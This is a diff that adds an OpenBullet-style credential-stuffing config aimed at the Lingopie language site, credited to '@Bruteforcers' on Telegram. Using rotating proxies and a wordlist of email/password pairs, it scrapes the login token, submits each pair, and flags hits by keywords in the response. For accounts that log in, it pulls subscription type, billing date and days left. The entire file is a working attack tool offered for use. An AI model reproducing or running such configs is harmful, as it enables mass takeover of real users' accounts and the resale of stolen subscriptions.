@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Lingopie",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-07T14:53:40.7674746+05:30",
+  "AdditionalInfo": "",
+  "Author": "@Bruteforcers",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://lingopie.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "token\" value=\"" "\">" -> VAR "token" 
+
+REQUEST POST "https://lingopie.com/login" 
+  CONTENT "_token=<token>&email=<USER>&password=<PASS>&remember=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" 
+  HEADER "origin: https://lingopie.com" 
+  HEADER "referer: https://lingopie.com/login" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 109" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid User name or Password" 
+    KEY "The email field is required" 
+  KEYCHAIN Success OR 
+    KEY "Private Lessons" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<ADDRESS>" Contains "pricing" 
+
+REQUEST GET "https://lingopie.com/api/user/subscription?full_info" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36" 
+  HEADER "referer: https://lingopie.com/app/account/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json" 
+
+PARSE "<SOURCE>" JSON "type" CreateEmpty=FALSE -> CAP "Subscription" 
+
+PARSE "<SOURCE>" JSON "next_billing" CreateEmpty=FALSE -> CAP "Next Billing Date" "[" "]" 
+
+PARSE "<SOURCE>" JSON "days_left" CreateEmpty=FALSE -> CAP "Days Left" 
+
+FUNCTION Constant "@Bruteforcers ~ Telegram" -> CAP "Config By " 
+
